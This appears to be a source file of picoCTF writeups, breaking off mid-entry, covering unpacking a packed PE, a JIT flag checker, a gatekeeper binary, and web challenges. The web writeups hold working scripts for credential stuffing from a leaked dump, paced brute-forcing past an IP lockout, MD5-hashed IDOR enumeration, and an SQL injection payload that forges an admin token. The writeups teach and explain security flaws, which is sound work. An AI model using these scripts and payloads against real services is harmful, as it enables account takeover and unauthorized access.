\`\`\`bash
rabin2 -S bin-ins.exe
\`\`\`

Important finding:
- custom section \`.ATOM\`
- file offset (\`paddr\`) = \`0x6000\`
- size = \`0x6fe00\`

This strongly suggests an embedded packed payload.

## 3) Extract \`.ATOM\`

\`\`\`bash
dd if=bin-ins.exe of=atom.bin bs=1 skip=$((0x6000)) count=$((0x6fe00)) status=none
\`\`\`

## 4) Identify compression format

\`\`\`bash
xxd -l 16 atom.bin
\`\`\`

Header starts with:
- \`5d 00 00 10 00 ...\`

That is the LZMA-alone header pattern.

## 5) Decompress \`.ATOM\` into inner executable

\`\`\`bash
python3 - << 'PY'
import lzma, pathlib
atom = pathlib.Path('atom.bin').read_bytes()
inner = lzma.decompress(atom, format=lzma.FORMAT_ALONE)
pathlib.Path('inner.exe').write_bytes(inner)
print('inner size:', len(inner))
PY

file inner.exe
\`\`\`

Result:
- \`inner.exe\` is another PE executable (real challenge logic).

## 6) Extract behavior clues from inner executable

\`\`\`bash
strings -n 5 inner.exe | rg -n "192\\.168\\.29\\.25|9867|Enter the key|key9e60dee4|Congratulations|flagParts|lstrcmpA|cGljb0NURnt|uM3R3MHJrXz|FzXzRQMXNfN|FNfVzMxMV85|ZTYwZGVlNH0K" -i
\`\`\`

Recovered strings include:
- \`192.168.29.25\`
- \`Enter the key:\`
- \`key9e60dee4\`
- \`Congratulations! Here's your flag:\`
- Base64 fragments:
- \`cGljb0NURnt\`
- \`uM3R3MHJrXz\`
- \`FzXzRQMXNfN\`
- \`FNfVzMxMV85\`
- \`ZTYwZGVlNH0K\`

## 7) Confirm compare logic in disassembly

\`\`\`bash
objdump -d -Mintel --start-address=0x401560 --stop-address=0x401a80 inner.exe
\`\`\`

Main flow:
- creates socket (\`WSAStartup\`, \`socket\`, \`connect\`)
- connects to \`192.168.29.25:9867\`
- sends text prompt
- receives response
- compares response with hardcoded key via \`lstrcmpA\`
- success path concatenates \`flagParts\` and sends success message + decoded flag content

## 8) Rebuild and decode the flag

Concatenate fragments first:

\`\`\`text
cGljb0NURntuM3R3MHJrXzFzXzRQMXNfNFNfVzMxMV85ZTYwZGVlNH0K
\`\`\`

Decode:

\`\`\`bash
python3 - << 'PY'
import base64
s = 'cGljb0NURntuM3R3MHJrXzFzXzRQMXNfNFNfVzMxMV85ZTYwZGVlNH0K'
print(base64.b64decode(s).decode())
PY
\`\`\`

Output:
- \`picoCTF{<redacted>}\`

## Final flag

\`picoCTF{<redacted>}\`
`,
  },
  {
    id: "10-jitfp-writeup",
    title: "JITFP Writeup",
    excerpt: "picoCTF JITFP writeup reversing a just-in-time compiled program, analyzing dynamically generated code to understand flag computation.",
    category: "picoCTF - Reverse Engineering",
    content: `# JITFP Writeup

Here is the exact writeup of how I solved it, step by step, including the tools and commands used.

## Files and tools used

- Remote binary on host: \`ad7e550b\`
- Tools:
- \`ssh\`
- \`file\`
- \`checksec\`
- \`objdump\`
- \`readelf\`
- \`strings\`
- \`python3\` (for runtime memory extraction via \`/proc/<pid>/mem\`)

## 1) Connect to the remote host

\`\`\`bash
ssh -p 62688 ctf-player@dolphin-cove.picoctf.net
\`\`\`

Password used:

\`\`\`text
1db87a14
\`\`\`

## 2) Identify the challenge binary

\`\`\`bash
ls -la
file ad7e550b
checksec --file=ad7e550b
\`\`\`

Key findings:
- 64-bit PIE ELF, stripped.
- Full RELRO, NX enabled.
- Program expects one argument (\`<flag>\`).

## 3) Confirm checker behavior and timing hint

\`\`\`bash
./ad7e550b
\`\`\`

Output shows usage:

\`\`\`text
Usage: ./ad7e550b <flag>
\`\`\`

Testing with dummy input shows:
- It prints progress markers (\`*\`) with delays.
- It can return partial progress then \`Incorrect\`.
- This matches the challenge hint: timing/progress leak.

## 4) Reverse the checker structure statically

I inspected disassembly and sections:

\`\`\`bash
objdump -d -Mintel ad7e550b | sed -n '700,1220p'
readelf -S ad7e550b
objdump -s -j .data ad7e550b
\`\`\`

Important observations:
- Main check loop validates 33 bytes (\`0x21\`).
- It sleeps between checks (\`sleep@plt\`) and prints \`*\` on success.
- It uses:
- a permutation table in \`.data\` at \`0x4020\` (33 dwords)
- a function-pointer table at \`0x4120\`
- each pointed function is a tiny \`cmp input_char, imm8\` checker.

This means each position checks for one exact character; the challenge hides the order via table indirection.

## 5) Extract the real checker table at runtime (host-only logic)

\`0x4120\` is populated in process memory, so I extracted it live from \`/proc/<pid>/mem\` while the binary runs.

Core idea:
- Start \`./ad7e550b\` with a 33-byte placeholder.
- Read function pointers from \`base + 0x4120\`.
- For each function pointer, read the compared byte immediate from function code.
- Apply permutation from \`0x4020\` to reconstruct the expected flag string.
- Patch argv memory in-place during execution to force all checks to pass.

One-shot script used on the remote host:

\`\`\`bash
python3 - <<'PY'
import os,pty,subprocess,time,select,sys,struct
perm=[0x1e,0x16,0x0b,0x20,0x19,0x04,0x09,0x07,0x13,0x17,0x05,0x1a,0x12,0x1b,0x10,0x01,0x08,0x0f,0x02,0x0e,0x03,0x0d,0x18,0x15,0x0c,0x11,0x06,0x0a,0x1d,0x1c,0x14,0x1f,0x00]
master, slave = pty.openpty()
arg = bytearray(b'A'*33)
p = subprocess.Popen(['./ad7e550b', arg.decode()], stdin=slave, stdout=slave, stderr=slave, close_fds=True)
os.close(slave)
pid=p.pid
maps=open(f'/proc/{pid}/maps').read().splitlines()
base=None; stack_lo=stack_hi=None
for l in maps:
    if 'ad7e550b' in l and 'r-xp' in l:
        base=int(l.split('-')[0],16)-0x1000
    if '[stack]' in l:
        lo,hi=l.split()[0].split('-'); stack_lo=int(lo,16); stack_hi=int(hi,16)
mem=open(f'/proc/{pid}/mem','r+b',0)
mem.seek(stack_lo)
stack=mem.read(stack_hi-stack_lo)
off=stack.find(b'A'*33+b'\\x00')
arg_addr=stack_lo+off
while True:
    try:
        mem.seek(base+0x4120)
        tbl=mem.read(8*33)
        if len(tbl)==8*33:
            vals=struct.unpack('<33Q',tbl)
            chars=[ord('?')]*33
            for i,v in enumerate(vals):
                if v:
                    mem.seek(v+12)      # immediate byte in tiny checker
                    b=mem.read(1)
                    if b: chars[i]=b[0]
            for pos,idx in enumerate(perm):
                c=chars[idx]
                if 32 <= c <= 126:
                    arg[pos]=c
            mem.seek(arg_addr)
            mem.write(arg)
    except Exception:
        pass
    r,_,_=select.select([master],[],[],0.02)
    if r:
        try:
            data=os.read(master,4096).decode('latin-1','ignore')
            if data:
                sys.stdout.write(data)
                sys.stdout.flush()
        except OSError:
            pass
    if p.poll() is not None:
        break
print("\\nRecovered:", arg.decode('latin-1'))
PY
\`\`\`

Output included:
- full progress then \`Correct\`
- recovered candidate string:

\`\`\`text
picoCTF{<redacted>}
\`\`\`

## 6) Verify by running with recovered flag

\`\`\`bash
./ad7e550b 'picoCTF{<redacted>}'
\`\`\`

Expected result:

\`\`\`text
Correct
\`\`\`

## Final flag

\`picoCTF{<redacted>}\`

## Optional: copy binary locally for offline notes

From local machine:

\`\`\`bash
scp -P 62688 ctf-player@dolphin-cove.picoctf.net:~/ad7e550b .
\`\`\`
`,
  },
  {
    id: "11-gatekeeper-writeup",
    title: "Gatekeeper Reverse Engineering Writeup",
    excerpt: "picoCTF Gatekeeper writeup reversing a gatekeeper binary with multiple validation stages to find the correct input sequence for the flag.",
    category: "picoCTF - Reverse Engineering",
    content: `# Gatekeeper Reverse Engineering Writeup

## Challenge Summary

The binary \`gatekeeper\` asks for a numeric code and, on success, reveals the flag. The hint says the program output is not straightforward and suggests reversing the string and removing extra text.

The remote target provided for the live flag was:

\`nc green-hill.picoctf.net 57942\`

## Initial Recon

Basic inspection showed that the file is a 64-bit ELF and is not stripped, which makes reverse engineering easier.

Useful commands:

\`\`\`bash
file gatekeeper
strings -n 4 gatekeeper
objdump -d -Mintel gatekeeper
objdump -s -j .rodata gatekeeper
\`\`\`

Important strings recovered from the binary:

- \`/flag.txt\`
- \`Access granted: \`
- \`ftc_oc_ip\`
- \`Enter a numeric code (must be > 999 ): \`
- \`Too small.\`
- \`Too high.\`
- \`Access Denied.\`

Those strings already suggest the flow:

1. Read an input string.
2. Parse and validate it.
3. If accepted, read \`/flag.txt\`.
4. Print the flag in a mangled format.

## Main Logic

Disassembly of \`main\` shows the full gate condition.

The program:

1. Reads up to 31 characters using \`scanf("%31s", ...)\`.
2. Stores the input length with \`strlen\`.
3. Checks whether the whole string is decimal.
4. If not decimal, checks whether the whole string is hexadecimal.
5. Converts decimal with \`atoi\` or hex with \`strtol(..., 16)\`.
6. Rejects values \`<= 999\`.
7. Rejects values \`> 9999\`.
8. Requires the original input length to be exactly 3 characters.
9. Calls \`reveal_flag()\` only if all checks pass.

That means the accepted inputs are:

- exactly 3 characters long
- either all decimal digits or all hexadecimal characters
- numeric value between 1000 and 9999 inclusive

The simplest passing input is:

\`3e8\`

Why it works:

- it is 3 characters long
- it is valid hexadecimal
- \`0x3e8 == 1000\`
- \`1000 > 999\`
- \`1000 <= 9999\`

## Validation Functions

There are two helper functions:

- \`is_valid_decimal\`
- \`is_valid_hex\`

\`is_valid_decimal\` checks every character with the libc ctype table and requires each one to be a decimal digit.

\`is_valid_hex\` does the same but accepts any hexadecimal digit (\`0-9\`, \`a-f\`, \`A-F\`).

There is no prefix handling like \`0x\`; the string must be pure hex characters.

## Flag Output Routine

The \`reveal_flag\` function:

1. Opens \`/flag.txt\` in read mode.
2. Reads the entire file into memory.
3. Prints \`Access granted: \`.
4. Iterates backward through the file contents, printing one character at a time.
5. Every time the current reverse index is divisible by 4, it also prints the extra text \`ftc_oc_ip\`.

This means the displayed output is intentionally obfuscated:

- the flag is reversed
- junk text is inserted periodically

The hint matches this exactly: reverse the string and remove extra text.

## Remote Solve

Submitting the correct input:

\`\`\`bash
nc green-hill.picoctf.net 57942
3e8
\`\`\`

The service returned:

\`\`\`text
Access granted: }1a9ftc_oc_ipb50aftc_oc_ip8_99ftc_oc_ip9_TGftc_oc_ip_xehftc_oc_ip_tigftc_oc_ipid_3ftc_oc_ip{FTCftc_oc_ipocipftc_oc_ip
\`\`\`

## Decoding the Flag

First remove every \`ftc_oc_ip\` substring:

\`\`\`text
}1a9b50a8_999_TG_xeh_tigid_3{FTCocip
\`\`\`

Then reverse the remaining string:

\`\`\`text
picoCTF{<redacted>}
\`\`\`

## Final Answer

Input that grants access:

\`3e8\`

Recovered flag:

\`picoCTF{<redacted>}\`

## Short Takeaway

This challenge is a straightforward binary RE task:

- recover validation logic from \`main\`
- find the minimal passing input
- inspect the flag printing routine
- undo the output transformation

The only trick is that the flag is not printed directly. It is reversed and padded with repeated junk text, so you need to clean it before reading the final result.
`,
  },
  {
    id: "credential-stuffing",
    title: "Credential Stuffing",
    excerpt: "picoCTF Credential Stuffing writeup using leaked credential databases to automate login attempts and gain unauthorized access to the target application.",
    category: "picoCTF - Web Exploitation",
    content: `# Credential Stuffing

## Challenge Summary

This picoCTF challenge demonstrates a classic credential stuffing attack. The premise is that a large department store suffered a breach, and a dump of stolen usernames and passwords was released. The goal is to take those leaked credentials and test them against another target, a local bank service, in the hope that at least one user reused the same password.

The service was exposed over a raw TCP connection and could be reached with:

\`\`\`bash
nc crystal-peak.picoctf.net 53447
\`\`\`

A credential file was also provided:

\`\`\`text
creds-dump.txt
\`\`\`

The task was to identify a valid reused credential and retrieve the flag.

## Concepts Tested

This challenge is built around the real-world weakness of password reuse.

When a user reuses the same username and password across multiple services:

- A breach on one site can become an entry point into a completely different site.
- Attackers do not need to crack hashes if they already have plaintext credentials.
- Automated login attempts across many accounts can produce account takeover very quickly.

That workflow is called credential stuffing.

## Initial Recon

The first step was to inspect the credential dump and confirm its structure.

\`\`\`bash
sed -n '1,20p' creds-dump.txt
\`\`\`

Example entries looked like this:

\`\`\`text
rora;winner1
birendra;rumble
khalid;sting
stanislaw;ming
maged;nimrod
\`\`\`

This immediately showed that each line contained:

- A username
- A semicolon separator
- A password

So the dump was already formatted for direct login attempts.

## Understanding the Target Service

Connecting to the service manually showed a simple username/password prompt:

\`\`\`bash
nc crystal-peak.picoctf.net 53447
\`\`\`

The service responded with:

\`\`\`text
=========================================
Welcome to the Online Banking Service!
=========================================

Please enter your username & password to login.
Username:
\`\`\`

After entering a username, it prompted for a password. Invalid attempts returned:

\`\`\`text
Invalid username or password
\`\`\`

That confirmed three important things:

- The service was interactive and line-based.
- No browser automation was needed.
- The challenge could be solved by repeatedly opening a connection, sending one username/password pair, and checking the response.

## First Approach

The obvious first approach was to test credentials directly using \`nc\` in a loop.

A simple conceptual version looks like this:

\`\`\`bash
while IFS=';' read -r user pass; do
  printf '%s\\n%s\\n' "$user" "$pass" | nc crystal-peak.picoctf.net 53447
done < creds-dump.txt
\`\`\`

In practice, raw loops over \`nc\` can be unreliable because:

- Some sessions close early.
- Some responses can be incomplete.
- Transient network issues can look like successful logins if you only check for missing error text.

During testing, a few false positives appeared when the connection dropped before the full invalid message was returned. That meant the scan needed to be more careful.

## Reliable Solution Strategy

Instead of trusting one-shot \`nc\` output blindly, the better approach was:

1. Open a connection.
2. Wait until the \`Username:\` prompt is received.
3. Send the username.
4. Wait until the \`Password:\` prompt is received.
5. Send the password.
6. Read the server's response.
7. Treat the result as valid only if a complete non-error response is returned.
8. Retry incomplete sessions rather than assuming they are hits.

This avoids mistaking network noise for successful authentication.

## Scripted Credential Stuffing

A small socket-based script was used to automate the process safely and accurately. The logic was:

- Read each \`username;password\` pair from \`creds-dump.txt\`
- Connect to the service
- Follow the prompts exactly
- Reject responses containing \`Invalid username or password\`
- Stop on the first real success

A representative version of the solution is below:

\`\`\`python
import socket
import time

HOST = "crystal-peak.picoctf.net"
PORT = 53447


def recv_until(sock, marker, timeout=3):
    sock.settimeout(timeout)
    data = b""
    while marker not in data:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data += chunk
    return data


with open("creds-dump.txt", "r", encoding="utf-8", errors="replace") as f:
    for line in f:
        line = line.strip()
        if not line or ";" not in line:
            continue

        user, password = line.split(";", 1)

        try:
            s = socket.create_connection((HOST, PORT), timeout=3)
            banner = recv_until(s, b"Username: ")
            if b"Username: " not in banner:
                s.close()
                continue

            s.sendall(user.encode() + b"\\n")

            prompt = recv_until(s, b"Password: ")
            if b"Password: " not in prompt:
                s.close()
                continue

            s.sendall(password.encode() + b"\\n")

            time.sleep(0.2)
            s.settimeout(1.5)
            response = b""

            while True:
                try:
                    chunk = s.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                except socket.timeout:
                    break

            s.close()

            output = (banner + prompt + response).decode("utf-8", "replace")

            if "Invalid username or password" not in output and response.strip():
                print(f"[+] Valid credential found: {user}:{password}")
                print(output)
                break

        except Exception:
            continue
\`\`\`

## Successful Credential Pair

The valid reused bank credential was:

\`\`\`text
tandie:griffith
\`\`\`

Once that pair was submitted to the service, the response was:

\`\`\`text
Authenticating...
Welcome tandie!
picoCTF{<redacted>}
\`\`\`

## Flag

\`\`\`text
picoCTF{<redacted>}
\`\`\`

## Why This Worked

This worked because one user reused their department store credentials on the online banking service. The leaked dump effectively became a ready-made login list for another platform.

The challenge mirrors a real attack path:

- Site A is breached.
- Credentials are leaked.
- Attackers test those credentials against Site B, Site C, Site D, and so on.
- Any reused credential becomes an account takeover.

No password cracking was required. No exploitation of the bank application itself was required. The weakness was entirely in credential reuse.

## Security Lessons

This challenge reinforces several practical defenses:

- Users should never reuse passwords across different services.
- Password managers reduce reuse by making unique passwords easy.
- Multi-factor authentication can prevent account takeover even if a password is reused.
- Login monitoring and rate limiting can help detect or slow credential stuffing attempts.
- Breached password checks should be integrated into authentication systems.

## Takeaway

The important lesson here is that authentication security is not only about protecting one application in isolation. A completely different site's breach can compromise your users if they reuse credentials. Credential stuffing succeeds because users treat passwords as reusable secrets, while attackers treat them as transferable assets.

In this challenge, the entire compromise came down to one reused pair:

\`\`\`text
tandie:griffith
\`\`\`

That single mistake revealed the flag:

\`\`\`text
picoCTF{<redacted>}
\`\`\`
`,
  },
  {
    id: "hashgate",
    title: "Hashgate",
    excerpt: "picoCTF Hashgate writeup exploiting an IDOR vulnerability where user IDs are hashed with MD5, allowing access to other users accounts by predicting hash values.",
    category: "picoCTF - Web Exploitation",
    content: `# Hashgate

## Challenge Summary

This picoCTF web challenge exposed a company portal with a standard login page and a hint that there were only about 20 employees in the organisation. The prompt also pointed out that the profile ID check was not using plain text, suggesting that some one-way function was involved.

Target:

\`\`\`text
http://crystal-peak.picoctf.net:57973/
\`\`\`

The objective was to reach the admin's profile and recover the flag.

## Initial Recon

Opening the main page showed a login form. The HTML source contained a helpful comment that leaked valid guest credentials:

\`\`\`html
<!-- Email: guest@picoctf.org Password: guest -->
\`\`\`

That meant the first useful step was to authenticate as the guest user and inspect what happened after login.

## Login Request

The frontend submitted credentials as JSON to \`/login\`:

\`\`\`http
POST /login
Content-Type: application/json

{"email":"guest@picoctf.org","password":"guest"}
\`\`\`

The server responded with a redirect:

\`\`\`http
HTTP/1.1 302 Found
Location: /profile/user/e93028bdc1aacdfb3687181f2031765d
\`\`\`

So the profile route looked like:

\`\`\`text
/profile/user/<hashed_value>
\`\`\`

## Inspecting the Guest Profile

Requesting the redirected profile returned:

\`\`\`text
Access level: Guest (ID: 3000). Insufficient privileges to view classified data. Only top-tier users can access the flag.
\`\`\`

This revealed an important detail:

- The guest account had numeric ID \`3000\`
- The URL used a 32-character hexadecimal value
- That strongly suggested a hash, likely MD5

## Verifying the Hash Function

To test whether the URL value was simply the hash of the numeric ID:

\`\`\`bash
printf '3000' | md5sum
\`\`\`

The result was:

\`\`\`text
e93028bdc1aacdfb3687181f2031765d
\`\`\`

That exactly matched the value in the guest profile URL.

So the application was building profile paths like this:

\`\`\`text
/profile/user/md5(user_id)
\`\`\`

This is not real authorization. It is only identifier obfuscation.

## Vulnerability

The bug is an insecure direct object reference, or IDOR.

The application assumed that hashing the internal numeric ID would hide other users' profiles. But if an attacker can infer:

- the hashing function
- the input format
- the likely ID range

then the attacker can compute other valid profile URLs directly.

Because the challenge stated there were only about 20 employees, brute-forcing nearby numeric IDs was trivial.

## Exploitation Strategy

The guest account was \`ID 3000\`, so the most likely admin account would be in a nearby range. The plan was:

1. Generate MD5 hashes for candidate IDs
2. Request \`/profile/user/<md5(id)>\`
3. Stop when a valid non-guest profile appeared

Example enumeration logic:

\`\`\`python
import hashlib
import urllib.request
import urllib.error

for i in range(2990, 3011):
    h = hashlib.md5(str(i).encode()).hexdigest()
    url = f"http://crystal-peak.picoctf.net:57973/profile/user/{h}"

    try:
        with urllib.request.urlopen(url) as r:
            body = r.read().decode()
        print(i, body)
    except urllib.error.HTTPError as e:
        print(i, "HTTP", e.code)
\`\`\`

## Successful Result

Enumeration showed that \`3010\` was the admin profile:

\`\`\`text
3010 Welcome, admin! Here is the flag: picoCTF{<redacted>}
\`\`\`

To confirm the exact admin URL:

\`\`\`bash
printf '3010' | md5sum
\`\`\`

Output:

\`\`\`text
281642b3b16d4a7c98e9ccdf7ba4c6c2
\`\`\`

So the admin profile endpoint was:

\`\`\`text
http://crystal-peak.picoctf.net:57973/profile/user/281642b3b16d4a7c98e9ccdf7ba4c6c2
\`\`\`

Requesting that endpoint returned the flag.

## Flag

\`\`\`text
picoCTF{<redacted>}
\`\`\`

## Why the Defense Failed

The application tried to protect profile access by hiding the raw numeric ID behind a hash. That fails for two reasons:

1. Hashing is not authorization.
2. The ID space was tiny and predictable.

Since the guest profile disclosed \`ID: 3000\`, an attacker immediately had a starting point. With only about 20 employees, testing nearby IDs was enough to recover the admin profile.

This is a common design mistake:

- Developers hide direct identifiers
- They assume hidden means protected
- Attackers enumerate the underlying values anyway

## Security Lessons

- Never rely on hashed or encoded object IDs as an access control mechanism.
- Every request for a resource must enforce server-side authorization.
- If a user requests another user's profile, the server must verify they are allowed to access it.
- Predictable identifier spaces make brute-force enumeration easy even when IDs are transformed.

## Takeaway

This challenge was solved by recognizing that the profile path used \`md5(user_id)\` instead of a secure access-control check. Once the guest profile exposed \`ID 3000\`, the rest became a small enumeration problem. Testing nearby IDs revealed that \`3010\` belonged to the admin account, and its hashed value led directly to the flag.

Final admin URL:

\`\`\`text
/profile/user/281642b3b16d4a7c98e9ccdf7ba4c6c2
\`\`\`

Final flag:

\`\`\`text
picoCTF{<redacted>}
\`\`\`
`,
  },
  {
    id: "fool-the-lockout",
    title: "Fool the Lockout",
    excerpt: "picoCTF Fool the Lockout writeup bypassing a rate-limiting lockout mechanism to brute-force credentials and access the protected endpoint.",
    category: "picoCTF - Web Exploitation",
    content: `# Fool the Lockout

## Challenge Summary

This picoCTF challenge provided three important pieces:

- A live login page
- The full Flask source code
- A credential dump containing candidate username/password pairs

Target:

\`\`\`text
http://candy-mountain.picoctf.net:52910/login
\`\`\`

Files provided:

- \`app.py\`
- \`creds-dump (1).txt\`

The goal was to bypass the IP-based rate limit, find the valid credential pair, log in, and capture the flag.

## Key Observation

The challenge explicitly claimed that brute forcing was prevented by an IP-based rate limit. That meant the source code mattered more than the login form itself.

So the first step was to read \`app.py\`.

## Source Code Analysis

The relevant rate-limiting logic was:

\`\`\`python
MAX_REQUESTS = 10
EPOCH_DURATION = 30
LOCKOUT_DURATION = 120
\`\`\`

The application tracked requests by \`request.remote_addr\` and updated a small in-memory database:

\`\`\`python
request_rates = {
    "ip_addr": {
        "num_requests": int,
        "epoch_start": timestamp,
        "lockout_until": int
    }
}
\`\`\`

The critical logic was inside \`refresh_request_rates_db()\` and \`exceeded_rate_limit()\`.

### How the lockout worked

For each client IP:

- Every \`POST\` to \`/login\` increased \`num_requests\`
- If more than 30 seconds passed since \`epoch_start\`, the request counter reset to \`0\`
- Lockout happened only when:

\`\`\`python
if request_rates[client_ip]['num_requests'] > MAX_REQUESTS:
\`\`\`

Since \`MAX_REQUESTS = 10\`, this means:

- Attempts \`1\` through \`10\` are allowed
- Attempt \`11\` within the same 30-second window triggers the lockout

That is the flaw.

## Vulnerability

The defense was not actually preventing guessing. It only limited the attacker to 10 guesses every 30 seconds from one IP.

So instead of brute forcing quickly, the correct bypass was simply to pace the requests:

1. Send 10 login attempts
2. Wait a little more than 30 seconds
3. Repeat

Because the epoch resets after 30 seconds, the counter returns to zero and the attacker gets another 10 attempts without ever triggering the lockout.

This is not a real brute-force prevention mechanism. It is only a speed bump.

## Why Header Spoofing Was Not Needed

Sometimes IP-based limits can be bypassed with headers like:

- \`X-Forwarded-For\`
- \`X-Real-IP\`

But in this application the code used:

\`\`\`python
client_ip = request.remote_addr
\`\`\`

So spoofed headers would not help unless there were a reverse proxy in front rewriting \`remote_addr\`, which there was not in this challenge.

The reliable bypass was timing, not header manipulation.

## Recon on the Login Form

Fetching the login page confirmed the form fields:

\`\`\`html
<input id="username" name="username" type="text">
<input id="password" name="password" type="password">
\`\`\`

So login requests needed standard form data:

\`\`\`text
username=<value>&password=<value>
\`\`\`

## Credential Dump

The dump contained 99 username/password pairs in the format:

\`\`\`text
username;password
\`\`\`

Example:

\`\`\`text
rora;winner1
birendra;rumble
khalid;sting
stanislaw;ming
...
\`\`\`

Since the file was small, a paced scan was practical.

## Exploitation Strategy

The correct attack plan was:

1. Read the credential dump
2. Submit 10 login attempts
3. Sleep for 31 seconds so the 30-second epoch expires
4. Continue with the next batch
5. Stop on the first successful redirect to \`/\`

That keeps the scan permanently below the lockout condition.

## Scripted Solution

The challenge hint mentioned that the Python \`requests\` library might be useful. That was exactly the right tool.

A working solution looked like this:

\`\`\`python
import time
import requests
from urllib.parse import urljoin

BASE = "http://candy-mountain.picoctf.net:52910"
LOGIN = urljoin(BASE, "/login")
HOME = urljoin(BASE, "/")

pairs = []
with open("creds-dump (1).txt", encoding="utf-8", errors="replace") as f:
    for line in f:
        line = line.rstrip("\\n")
        if ";" in line:
            pairs.append(tuple(line.split(";", 1)))

s = requests.Session()
attempts_in_epoch = 0

for user, pwd in pairs:
    if attempts_in_epoch == 10:
        time.sleep(31)
        attempts_in_epoch = 0

    r = s.post(
        LOGIN,
        data={"username": user, "password": pwd},
        allow_redirects=False,
        timeout=10
    )
    attempts_in_epoch += 1

    if r.status_code in (301, 302, 303, 307, 308) and r.headers.get("Location") == "/":
        home = s.get(HOME, timeout=10)
        print(f"[+] Found valid creds: {user}:{pwd}")
        print(home.text)
        break
\`\`\`

## Valid Credential Pair

The valid account in the dump was:

\`\`\`text
rohit:berry
\`\`\`

After logging in with that pair, the homepage displayed the flag.

## Flag

\`\`\`text
picoCTF{<redacted>}
\`\`\`

## Why the Defense Failed

The application did not stop credential guessing. It only enforced a per-IP attempt cap inside a short time window.

That means:

- It slowed guessing down
- It did not stop guessing
- It still allowed the full dump to be tested eventually

The bug is a weak rate-limiting design, not a single line coding mistake.

The developer assumed that "blocking fast guessing" meant "guessing is impossible." That assumption was wrong.

## Security Lessons

- Rate limiting should be combined with stronger protections, not used alone.
- Lockouts based only on IP are weak, especially against distributed attacks.
- Time-window rate limits can often be bypassed by simply pacing requests.
- MFA and anomaly detection are far more effective against credential attacks.
- Real defenses should consider account-based controls, IP reputation, device fingerprinting, and breached-password detection.

## Takeaway

This challenge was solved by reading the source carefully instead of fighting the lockout directly. The application allowed 10 attempts every 30 seconds, so the right move was to stay just under that threshold and walk through the credential dump patiently.

The winning credential pair was:

\`\`\`text
rohit:berry
\`\`\`

And the recovered flag was:

\`\`\`text
picoCTF{<redacted>}
\`\`\`
`,
  },
  {
    id: "secret-box",
    title: "Secret Box",
    excerpt: "picoCTF Secret Box writeup exploiting SQL injection to forge authentication tokens and access the secret content containing the flag.",
    category: "picoCTF - Web Exploitation",
    content: `# Secret Box

## Challenge Summary

This picoCTF challenge presented a small secret-sharing web app and claimed that only each user could see their own secrets. The goal was to recover the admin's secret from the live site.

Target:

\`\`\`text
http://candy-mountain.picoctf.net:52404/
\`\`\`

Provided file:

- \`source.tar.gz\`

The source code was the key to solving the challenge.

## Initial Analysis

After extracting the archive, the important files were:

- \`app/src/server.js\`
- \`app/src/handler.js\`
- \`app/src/db.js\`
- \`db/initdb.sql\`

The database initialization file showed a seeded admin account and admin secret:

\`\`\`sql
INSERT INTO users(id, username, password) VALUES ('e2a66f7d-2ce6-4861-b4aa-be8e069601cb', 'admin', 'fake_password');
INSERT INTO secrets(owner_id, content) VALUES ('e2a66f7d-2ce6-4861-b4aa-be8e069601cb', 'picoCTF{<redacted>}');
\`\`\`

Later, \`db.js\` replaced those placeholders with the real password and flag from environment variables:

\`\`\`js
await db('users')
  .where({ id: 'e2a66f7d-2ce6-4861-b4aa-be8e069601cb' })
  .update({ password: process.env.USERPASSWORD });

await db('secrets')
  .where({ owner_id: 'e2a66f7d-2ce6-4861-b4aa-be8e069601cb' })
  .update({ content: process.env.FLAG });
\`\`\`

So the admin UUID was fixed and known:

\`\`\`text
e2a66f7d-2ce6-4861-b4aa-be8e069601cb
\`\`\`

## Looking for the Injection Point

Most of the queries were parameterized safely. For example, login used:

\`\`\`js
const userResult = await db.raw(
  \`SELECT * FROM users WHERE username = ? AND password = ? LIMIT 1\`,
  [username, password]
);
\`\`\`

The vulnerable route was \`POST /secrets/create\`:

\`\`\`js
app.post('/secrets/create', authMiddleware, async (req, res) => {
  const userId = req.userId;
  if (!userId){
    res.clearCookie('auth_token');
    return res.redirect('/');
  }

  const content = req.body.content;
  const query = await db.raw(
    \`INSERT INTO secrets(owner_id, content) VALUES ('\${userId}', '\${content}')\`
  );

  return res.redirect('/');
});
\`\`\`

This is classic SQL injection:

- \`userId\` is interpolated directly
- \`content\` is interpolated directly
- the query is not parameterized

That means any authenticated user can break out of the string inside \`content\` and run arbitrary SQL.

## Exploitation Strategy

The cleanest approach was:

1. Sign up as a normal user
2. Log in normally
3. Use the SQL injection in \`/secrets/create\` to insert a valid token for the admin user
4. Replace the browser cookie \`auth_token\` with the forged admin token
5. Visit \`/\` and read the admin's secret

This works because the authentication middleware trusts the \`tokens\` table:

\`\`\`js
const query = await db.raw(
  \`SELECT * FROM tokens WHERE id = ? AND expired_at > NOW()\`,
  [token]
);
\`\`\`

If we can insert our own row into \`tokens\` with:

- a token ID we choose
- \`user_id\` set to the admin UUID

then the server will accept us as admin.

## Injection Payload

The original vulnerable query looked like:

\`\`\`sql
INSERT INTO secrets(owner_id, content) VALUES ('<userId>', '<content>')
\`\`\`

So the payload can terminate the \`content\` string, close the \`VALUES\` clause, and add a second SQL statement:

\`\`\`sql
x'); INSERT INTO tokens(id, user_id) VALUES ('MYTOKEN', 'e2a66f7d-2ce6-4861-b4aa-be8e069601cb');--
\`\`\`

This transforms the query into:

\`\`\`sql
INSERT INTO secrets(owner_id, content) VALUES ('<our_user_id>', 'x');
INSERT INTO tokens(id, user_id) VALUES ('MYTOKEN', 'e2a66f7d-2ce6-4861-b4aa-be8e069601cb');
--')
\`\`\`

The trailing \`--\` comments out the leftover characters.

## Working Exploit Script

A working solution using Python \`requests\`:

\`\`\`python
import requests
import uuid

BASE = "http://candy-mountain.picoctf.net:52404"
ADMIN_ID = "e2a66f7d-2ce6-4861-b4aa-be8e069601cb"

username = "u" + uuid.uuid4().hex[:8]
password = "p" + uuid.uuid4().hex[:8]
forged_token = "tok_" + uuid.uuid4().hex

s = requests.Session()

# create user
s.post(BASE + "/signup", data={
    "username": username,
    "password": password
})

# log in as the new user
s.post(BASE + "/login", data={
    "username": username,
    "password": password
})

# SQL injection to insert an admin token we control
payload = (
    "x'); INSERT INTO tokens(id, user_id) VALUES "
    f"('{forged_token}', '{ADMIN_ID}');--"
)

s.post(BASE + "/secrets/create", data={
    "content": payload
})

# replace cookie with forged admin token
s.cookies.set("auth_token", forged_token, domain="candy-mountain.picoctf.net", path="/")

# read admin secrets
r = s.get(BASE + "/")
print(r.text)
\`\`\`

## Result

After forging an admin token and reloading the homepage, the admin's secret was displayed:

\`\`\`text
picoCTF{<redacted>}
\`\`\`

## Flag

\`\`\`text
